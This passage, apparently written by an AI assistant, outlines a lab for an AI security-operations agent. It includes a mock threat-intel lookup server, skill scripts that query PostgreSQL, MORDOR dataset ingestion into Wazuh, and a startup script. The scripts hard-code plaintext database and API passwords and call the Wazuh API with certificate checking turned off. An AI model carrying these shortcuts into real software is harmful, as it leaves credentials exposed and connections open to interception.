            "reputation_score": row[0],
            "malicious": row[1],
            "tags": row[2],
            "source": row[3],
            "metadata": row[4],
            "cached": True
        }
        cur.close()
        conn.close()
        return result

    # Perform lookup (mock implementation)
    malicious = False
    reputation_score = 50  # Neutral
    tags = []
    metadata = {}

    if indicator_type == "ip":
        if indicator in KNOWN_MALICIOUS_IPS:
            malicious = True
            reputation_score = 5
            tags = ["malware-c2", "phishing"]
            metadata = {"campaigns": ["APT-X"], "first_seen": "2024-01-15"}
        elif indicator.startswith("10.") or indicator.startswith("192.168.") or indicator.startswith("172."):
            reputation_score = 80  # Internal IP
            tags = ["internal"]

    elif indicator_type == "hash":
        if indicator in KNOWN_MALICIOUS_HASHES:
            malicious = True
            reputation_score = 3
            tags = ["trojan", "ransomware"]
            metadata = {"file_name": "malware.exe", "family": "Generic"}

    elif indicator_type == "domain":
        if indicator in KNOWN_MALICIOUS_DOMAINS:
            malicious = True
            reputation_score = 8
            tags = ["phishing", "credential-harvesting"]
            metadata = {"category": "phishing", "registrar": "suspicious-registrar"}

    # Cache result
    cur.execute("""
        INSERT INTO threat_intel (indicator, indicator_type, reputation_score, malicious, tags, source, metadata)
        VALUES (%s, %s, %s, %s, %s, %s, %s)
        ON CONFLICT (indicator) DO UPDATE
        SET reputation_score = EXCLUDED.reputation_score,
            malicious = EXCLUDED.malicious,
            tags = EXCLUDED.tags,
            metadata = EXCLUDED.metadata,
            last_updated = NOW()
    """, (indicator, indicator_type, reputation_score, malicious, tags, "mock-ti", json.dumps(metadata)))

    conn.commit()
    cur.close()
    conn.close()

    return {
        "indicator": indicator,
        "indicator_type": indicator_type,
        "reputation_score": reputation_score,
        "malicious": malicious,
        "tags": tags,
        "source": "mock-ti",
        "metadata": metadata,
        "cached": False
    }

# MCP Server protocol implementation
def handle_request(request: dict) -> dict:
    """Handle MCP request"""
    method = request.get("method")
    params = request.get("params", {})

    if method == "lookup":
        indicator = params.get("indicator")
        indicator_type = params.get("type", "unknown")
        result = lookup_indicator(indicator, indicator_type)
        return {"result": result}

    else:
        return {"error": f"Unknown method: {method}"}

def main():
    """MCP Server main loop"""
    for line in sys.stdin:
        try:
            request = json.loads(line)
            response = handle_request(request)
            print(json.dumps(response))
            sys.stdout.flush()
        except Exception as e:
            error_response = {"error": str(e)}
            print(json.dumps(error_response))
            sys.stdout.flush()

if __name__ == "__main__":
    main()
```

### Step 6: Claude Skills for Case Knowledge

```python
# .claude/skills/case_knowledge.py
"""
Query past case knowledge for similar alerts
Uses PostgreSQL with flexible pattern matching
"""

import psycopg2
import json
import sys

def query_case_knowledge(alert_signature: str, limit: int = 5) -> list:
    """Query past case knowledge by alert signature"""
    conn = psycopg2.connect(
        host="localhost",
        port="5432",
        database="cyber_response",
        user="agent",
        password="agent_password"
    )
    cur = conn.cursor()

    cur.execute("""
        SELECT
            ck.id,
            ck.alert_signature,
            ck.alert_summary,
            ck.investigation_process,
            ck.key_findings,
            ck.disposition,
            ck.confidence_score,
            ck.pattern_indicators,
            ck.reference_count
        FROM case_knowledge ck
        WHERE ck.alert_signature = %s
        ORDER BY ck.reference_count DESC, ck.created_at DESC
        LIMIT %s
    """, (alert_signature, limit))

    results = []
    for row in cur.fetchall():
        results.append({
            "id": row[0],
            "alert_signature": row[1],
            "alert_summary": row[2],
            "investigation_process": row[3],
            "key_findings": row[4],
            "disposition": row[5],
            "confidence_score": float(row[6]) if row[6] else None,
            "pattern_indicators": row[7],
            "reference_count": row[8]
        })

    # Update reference counts
    if results:
        case_ids = [r["id"] for r in results]
        cur.execute(f"""
            UPDATE case_knowledge
            SET reference_count = reference_count + 1,
                last_referenced = NOW()
            WHERE id = ANY(%s)
        """, (case_ids,))
        conn.commit()

    cur.close()
    conn.close()

    return results

def main():
    """Skill entry point"""
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: case_knowledge.py <alert_signature>"}))
        sys.exit(1)

    alert_signature = sys.argv[1]
    results = query_case_knowledge(alert_signature)

    print(json.dumps(results, indent=2, default=str))

if __name__ == "__main__":
    main()
```

```python
# .claude/skills/playbook.py
"""
Load investigation playbook for alert type
"""

import psycopg2
import json
import sys

def get_playbook(alert_signature: str) -> dict:
    """Get playbook for alert signature"""
    conn = psycopg2.connect(
        host="localhost",
        port="5432",
        database="cyber_response",
        user="agent",
        password="agent_password"
    )
    cur = conn.cursor()

    cur.execute("""
        SELECT
            name,
            description,
            investigation_steps,
            common_fp_patterns,
            escalation_criteria,
            auto_close_threshold
        FROM playbooks
        WHERE alert_signature = %s
    """, (alert_signature,))

    row = cur.fetchone()

    if not row:
        cur.close()
        conn.close()
        return {"error": "Playbook not found"}

    playbook = {
        "alert_signature": alert_signature,
        "name": row[0],
        "description": row[1],
        "investigation_steps": row[2],
        "common_fp_patterns": row[3],
        "escalation_criteria": row[4],
        "auto_close_threshold": float(row[5])
    }

    cur.close()
    conn.close()

    return playbook

def main():
    """Skill entry point"""
    if len(sys.argv) < 2:
        print(json.dumps({"error": "Usage: playbook.py <alert_signature>"}))
        sys.exit(1)

    alert_signature = sys.argv[1]
    playbook = get_playbook(alert_signature)

    print(json.dumps(playbook, indent=2, default=str))

if __name__ == "__main__":
    main()
```

### Step 7: Ingesting Public Datasets (MORDOR/EVTX-ATTACK-SAMPLES)

```bash
# scripts/ingest_mordor_dataset.sh
#!/bin/bash
# Download and ingest MORDOR dataset into Wazuh

set -e

MORDOR_REPO="https://github.com/OTRF/Security-Datasets.git"
DATASET_PATH="/workspace/datasets/mordor"

echo "Downloading MORDOR datasets..."
git clone --depth 1 $MORDOR_REPO $DATASET_PATH

echo "Converting MORDOR logs to Wazuh format..."
# This requires custom parsing script based on dataset format

python3 /workspace/scripts/convert_mordor_to_wazuh.py \
    --input "$DATASET_PATH/datasets/atomic/windows/" \
    --output "/workspace/datasets/wazuh-logs/"

echo "Ingesting logs into Wazuh indexer..."
# Send logs to Wazuh for processing
# This can be done via logstash, filebeat, or direct API

echo "Dataset ingestion complete!"
```

```python
# scripts/convert_mordor_to_wazuh.py
#!/usr/bin/env python3
"""
Convert MORDOR dataset to Wazuh-compatible format
"""

import json
import sys
import argparse
from pathlib import Path

def convert_mordor_event(event: dict) -> dict:
    """Convert MORDOR event to Wazuh alert format"""
    # Map MORDOR fields to Wazuh alert structure
    # This is dataset-specific and needs customization

    wazuh_alert = {
        "timestamp": event.get("@timestamp"),
        "agent": {
            "name": "mordor-dataset",
            "id": "000"
        },
        "rule": {
            "description": event.get("event_description", "MORDOR dataset event"),
            "level": 5,
            "id": "100001"
        },
        "data": event  # Preserve original event data
    }

    return wazuh_alert

def main():
    parser = argparse.ArgumentParser(description="Convert MORDOR to Wazuh format")
    parser.add_argument("--input", required=True, help="Input MORDOR dataset path")
    parser.add_argument("--output", required=True, help="Output directory for Wazuh logs")

    args = parser.parse_args()

    input_path = Path(args.input)
    output_path = Path(args.output)
    output_path.mkdir(parents=True, exist_ok=True)

    # Process JSON files in dataset
    for json_file in input_path.glob("**/*.json"):
        print(f"Processing {json_file}...")

        with open(json_file, 'r') as f:
            events = json.load(f)

        # Convert events
        wazuh_events = [convert_mordor_event(e) for e in events]

        # Write to output
        output_file = output_path / f"{json_file.stem}_wazuh.json"
        with open(output_file, 'w') as f:
            for event in wazuh_events:
                f.write(json.dumps(event) + "\n")

        print(f"  Wrote {len(wazuh_events)} events to {output_file}")

if __name__ == "__main__":
    main()
```

### Step 8: Startup Script

```bash
#!/bin/bash
# startup.sh - Start the playground environment

set -e

echo "🚀 Starting Cyber Response Agent Playground (v2)"
echo "=================================================="

# Create directory structure
mkdir -p target-endpoint/workloads
mkdir -p mcp-servers
mkdir -p .claude/skills
mkdir -p sandbox-scripts
mkdir -p datasets
mkdir -p scripts

# Start Docker Compose stack
echo "📦 Starting Docker Compose stack..."
docker-compose up -d

# Wait for PostgreSQL to be ready
echo "⏳ Waiting for PostgreSQL..."
until docker-compose exec -T postgres pg_isready -U agent -d cyber_response; do
  sleep 2
done

echo "✓ PostgreSQL is ready"

# Wait for Wazuh to be ready
echo "⏳ Waiting for Wazuh Manager..."
sleep 30

# Check Wazuh API
echo "✓ Checking Wazuh API..."
curl -k -u wazuh-api:MyS3cr37P450r.*- https://localhost:55000/ || echo "Wazuh API may need more time"

echo ""
echo "✅ Playground environment is ready!"
echo ""
echo "📊 Services:"
echo "  - Wazuh Dashboard: http://localhost:5601 (admin/SecretPassword)"
echo "  - PostgreSQL: localhost:5432 (agent/agent_password)"
echo "  - Target Endpoint: Running with auditd + Wazuh agent"
echo ""
echo "🔧 MCP Servers:"
echo "  - wazuh: Query alerts from SIEM (socfortress implementation)"
echo "  - ticketing: Close tickets, update status, add case knowledge"
echo "  - threat_intel: IOC lookups with caching"
echo ""
echo "📝 Claude Skills:"
echo "  - case_knowledge.py: Query past case investigations"
echo "  - playbook.py: Load investigation playbooks"
echo ""
echo "🧪 Testing:"
echo "  1. Check alerts: psql -h localhost -U agent -d cyber_response -c 'SELECT COUNT(*) FROM tickets;'"
echo "  2. Test playbook: python3 .claude/skills/playbook.py suspicious_powershell"
echo "  3. Test case knowledge: python3 .claude/skills/case_knowledge.py suspicious_powershell"
echo "  4. Investigate endpoint: docker exec -it target-endpoint bash"
echo ""
echo "📚 Next Steps:"
echo "  - Ingest MORDOR dataset: ./scripts/ingest_mordor_dataset.sh"
echo "  - Configure Wazuh detection rules"
echo "  - Build the investigation agent"
echo ""
```

---

## Quick Start

```bash
# From your devcontainer

# 1. Make startup script executable
chmod +x startup.sh

# 2. Start the environment
./startup.sh

# 3. Verify target endpoint is generating events
docker exec target-endpoint tail -f /var/log/audit/audit.log

# 4. Check Wazuh agent status
docker exec target-endpoint /var/ossec/bin/wazuh-control status

# 5. Query tickets database
psql -h localhost -U agent -d cyber_response -c "SELECT alert_signature, COUNT(*) FROM tickets GROUP BY alert_signature;"

# 6. Test skills
python3 .claude/skills/playbook.py suspicious_powershell
python3 .claude/skills/case_knowledge.py suspicious_powershell

# 7. Investigate endpoint (like EDR console)
docker exec -it target-endpoint bash
# Inside container:
ps aux
cat /var/log/audit/audit.log
ausearch -k process_execution
```

---

## Architecture Benefits

### Realistic EDR Simulation
- Real processes, files, and network events
- Actual auditd capturing system calls
- Wazuh agent forwarding logs (like production EDR)
- Investigate via `docker exec` (mimics EDR console access)

### Existing Wazuh MCP
- Production-ready integration (socfortress)
- Natural language queries
- No need to build custom SIEM wrapper

### Flexible Data Model
- JSONB for signature-specific fields (no rigid schema)
- Enriched case knowledge (replaces static false positive rules)
- Human-readable closure reasons
- Tracks investigation context for learning

### Public Dataset Support
- Ingest MORDOR/EVTX-ATTACK-SAMPLES for realistic Windows events
- Real-world attack patterns
- Ground truth labels for evaluation

---

## Public Datasets for Testing

### 1. MORDOR Project
- **Source**: https://github.com/OTRF/Security-Datasets
- **Content**: Simulated adversary techniques (MITRE ATT&CK)
- **Format**: JSON (Windows Event Logs, Sysmon)
- **Use case**: Realistic Windows endpoint telemetry

### 2. EVTX-ATTACK-SAMPLES
- **Source**: https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES
- **Content**: Windows event logs mapped to ATT&CK techniques
- **Format**: EVTX (Windows Event Log)
- **Use case**: Real attack patterns from research

### 3. Splunk BOTS (Boss of the SOC)
- **Source**: https://www.splunk.com/en_us/blog/conf-splunklive/boss-of-the-soc-scoring-server-questions-and-answers-and-dataset-open-sourced-and-ready-for-download.html
- **Content**: CTF-style security datasets with APT scenarios
- **Format**: Various (logs, PCAP, alerts)
- **Use case**: Complex investigation scenarios with ground truth

### 4. LMG Security Datasets
- **Source**: Various CTF/training materials
- **Content**: Labeled security events
- **Use case**: Training and evaluation

### 5. CICIDS2017/2019
- **Source**: https://www.unb.ca/cic/datasets/
- **Content**: Network intrusion detection datasets
- **Format**: PCAP, CSV logs
- **Use case**: Network-based alerts

---

## Implementation Status

### ✅ Completed
1. **Target Endpoint Container** - Ubuntu 22.04 with workload scripts generating realistic activity
2. **Falco eBPF Monitoring** - Capturing syscalls, file access, network events in JSON format
3. **Docker Compose Environment** - Containers orchestrated and communicating
4. **Wazuh Stack Setup** - Wazuh Manager (v4.9.2), Indexer, Dashboard deployed using Docker Compose chaining
5. **PostgreSQL Database** - pgvector-enabled database with tickets table schema

### 🚧 In Progress
6. **Falco → Wazuh Integration** - Next: Mount falco-logs volume to Wazuh Manager and configure ingestion

### 📋 Next Steps
7. **PostgreSQL Ticket System** - Create integration to push Wazuh alerts → PostgreSQL tickets
7. **Populate database with MORDOR data** - Get realistic alerts for testing
8. **Configure Wazuh detection rules** - Map to alert signatures
9. **Build investigation agent** - Core decision logic
10. **Manually label subset** - Create ground truth for evaluation
11. **Implement confidence scoring** - Decision thresholds
12. **Add reproduction sandbox** - Test hypotheses safely
13. **Build metrics dashboard** - Track agent performance

---

## Key Improvements Over v1

| Aspect | v1 | v2 |
|--------|----|----|
| **EDR Simulation** | Synthetic JSON alerts | Real auditd events from Ubuntu container |
| **Investigation** | No direct access | `docker exec` for live investigation |
| **Wazuh MCP** | Custom-built | Production-ready (socfortress) |
| **Database** | Rigid investigations table | Flexible case_knowledge with JSONB |
| **False Positives** | Static pattern table | Enriched case knowledge with context |
| **Datasets** | Synthetic only | Support for MORDOR/EVTX-ATTACK |
| **Closure Reason** | Missing | Human-readable explanation field |

---

Let me know which component you'd like to build first, or if you'd like me to refine any section!
